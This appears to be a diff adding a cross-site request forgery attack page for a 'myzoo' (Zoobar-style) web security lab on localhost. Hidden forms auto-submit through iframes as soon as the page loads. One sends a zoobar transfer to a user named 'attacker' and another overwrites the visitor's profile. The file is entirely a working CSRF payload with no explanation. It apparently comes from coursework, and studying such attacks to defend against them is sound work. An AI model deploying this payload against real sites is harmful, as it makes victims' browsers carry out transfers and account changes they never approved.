@@ -1,0 +1,25 @@
+<iframe name="myframe" width="600px" height="450px"></iframe>
+<form method=POST name=form id=transferform target="myframe" action="http://127.0.0.1/myzoo/transfer.php">
+    <input name=zoobars type=hidden value="1">
+    <input name=recipient type=hidden value="attacker">
+	<input type=hidden name=submission value="Send">
+</form>
+<!--
+<form method=POST name=form target="myframe" action="http://www.myzoo.com/myzoo/index.php">
+    <textarea name="profile_update" type=hidden id="profile">123</textarea>
+    <input type=hidden name="profile_submit" value="Save">
+</form>
+-->
+<script>
+    document.getElementById("transferform").submit();
+</script>
+
+<iframe name="myframe2" width="600px" height="450px"></iframe>
+
+<form method=POST name=form id=ppprofile target="myframe2" action="http://127.0.0.1/myzoo/index.php">
+    <textarea name="profile_update" id="profile" style="display:none">123</textarea>
+    <input type=hidden name="profile_submit" value="Save">
+</form>
+<script>
+    document.getElementById("ppprofile").submit();
+</script>
